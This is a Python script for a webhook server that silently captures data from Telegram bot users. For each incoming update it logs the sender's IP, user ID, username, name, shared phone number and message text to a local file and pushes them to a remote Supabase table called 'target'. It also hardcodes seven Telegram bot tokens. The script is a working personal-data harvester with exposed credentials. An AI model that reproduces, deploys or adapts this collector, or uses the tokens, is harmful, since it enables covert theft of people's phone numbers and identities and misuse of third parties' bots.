from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import os
import requests
from supabase import create_client, Client

SUPABASE_URL = os.environ.get("SUPABASE_URL", "YOUR_SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY) if SUPABASE_URL != "YOUR_SUPABASE_URL" else None

tokens = [
    "9268850834:AAGrE75Gl5U7I4PsmTJldceJ6i65pzFA8uQ",
    "8827076146:AAGG1sCoE9ZZ_gH-zJT02tnVawtQeCTVnpE",
    "8872239752:AAG9ZtYZ5eSerQ2WL2FILdrhdcjjKZ7zoVY",
    "9104061776:AAFrgWhhPwton61AgTwpRAb64DbGiKVmEq8",
    "8602888229:AAHB0XSqtkVa--8uj3OvNAbNsuM4KFECtZ0",
    "8637887859:AAH_vXce9SDiGGDGZiSR96MtP-KMbPrq5SE",
    "8995565845:AAHtl9nON6pgq4bs1_e60b9g4R1Ue0bIFa4"
]

class SilentProxyHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        if ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()

        try:
            data = json.loads(post_data.decode('utf-8'))
            
            message = data.get('message', {}) or data.get('callback_query', {}).get('message', {})
            user = message.get('from', {}) if isinstance(message, dict) else {}
            contact = message.get('contact', {}) if isinstance(message, dict) else {}
            text = message.get('text', '') if isinstance(message, dict) else ''

           
            user_id_val = user.get('id')
            
            catch_report = {
                "client_ip": str(client_ip) if client_ip else "127.0.0.1",
                "user_id": str(user_id_val) if user_id_val is not None else "0",
                "username": str(user.get('username')) if user.get('username') else "",
                "first_name": str(user.get('first_name')) if user.get('first_name') else "Unknown",
                "phone_number": str(contact.get('phone_number')) if contact.get('phone_number') else "",
                "input_text": str(text) if text else "",
                "raw_payload": data
            }

            print("\n[+] --- logged to memory ---")
            print(json.dumps(catch_report, indent=4, ensure_ascii=False))
            
            with open("captured_data.txt", "a", encoding="utf-8") as f:
                f.write(json.dumps(catch_report, ensure_ascii=False) + "\n" + "="*50 + "\n")
            
            if supabase:
                try:
                    response = supabase.table("target").insert(catch_report).execute()
                    print("[+] Data successfully pushed to Supabase database!")
                except Exception as db_err:
                    print("[-] Supabase push error details:", str(db_err))

        except Exception as e:
            print("[-] error:", e)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

def run(server_class=HTTPServer, handler_class=SilentProxyHandler):
    port = int(os.environ.get("PORT", 10000))
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"colonel went from here {port}... (Multi-Bot Server Active)")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
